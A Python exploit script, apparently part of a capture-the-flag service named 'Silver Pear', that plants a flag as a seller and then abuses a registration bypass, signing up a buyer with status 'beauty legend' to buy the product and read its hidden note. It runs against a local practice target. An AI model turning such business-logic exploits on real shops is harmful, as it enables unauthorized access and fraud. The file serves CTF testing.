from __future__ import annotations

import argparse
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
CHECKER = ROOT / "checker"
if str(CHECKER) not in sys.path:
    sys.path.insert(0, str(CHECKER))

from common import create_product_with_flag, register_and_login


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Silver Pear status=beauty legend registration bypass")
    parser.add_argument("target", nargs="?", default="http://127.0.0.1:7777")
    parser.add_argument("--flag", default="FLAG{demo_status_beauty_legend}")
    parser.add_argument("--price", type=int, default=3500)
    args = parser.parse_args()

    seller, seller_name, _ = register_and_login(args.target, prefix="v1_seller", role="seller")
    created = create_product_with_flag(seller, args.flag, price=args.price, title_prefix="V1")
    product_id = int(created["product"]["id"])
    slot = created["note_slot"]

    attacker, username, _ = register_and_login(
        args.target,
        prefix="legend",
        role="buyer",
        status="beauty legend",
    )
    order = attacker.create_order()["order"]
    order = attacker.add_order_item(order["public_id"], product_id)["order"]
    order = attacker.checkout_order(order["public_id"])["order"]
    notes = attacker.get_notes(product_id)[1]["notes"]

    print(f"username={username}")
    print(f"seller={seller_name}")
    print(f"product_id={product_id}")
    print(f"slot={slot}")
    print(f"final_price={order['final_price']}")
    print(notes[slot])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
